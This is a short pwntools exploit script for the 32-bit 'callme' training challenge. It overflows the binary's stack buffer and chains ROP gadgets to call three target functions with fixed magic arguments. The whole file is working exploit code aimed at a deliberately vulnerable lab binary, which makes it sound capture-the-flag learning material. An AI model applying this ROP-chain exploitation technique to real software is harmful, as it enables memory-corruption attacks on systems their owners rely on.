from pwn import *

context.update(os='linux', arch='i386', bits='32', log_level='debug')
io = process("./callme32")

# gadget
pop3         = 0x80487f9 # pop esi; pop edi; pop ebp; ret;

# target functions
callme_one   = 0x80484f0
callme_two   = 0x8048550
callme_three = 0x80484e0


def invoke_function_call(func: int) -> bytes:
    layout = b""
    layout += p32(func)
    layout += p32(pop3)
    layout += p32(0xdeadbeef)
    layout += p32(0xcafebabe)
    layout += p32(0xd00df00d)
    
    return layout


def gen_payload(size: int) -> bytes:
    offset = cyclic_find("laaa", n=4)
    log.info(f"offset: {offset}")

    payload = b""
    payload += b"A" * offset
    payload += invoke_function_call(func=callme_one)
    payload += invoke_function_call(func=callme_two)
    payload += invoke_function_call(func=callme_three)
    payload += b"C" * (size - len(payload))

    return payload


io.sendlineafter(b"> ", gen_payload(size=80))
io.interactive()
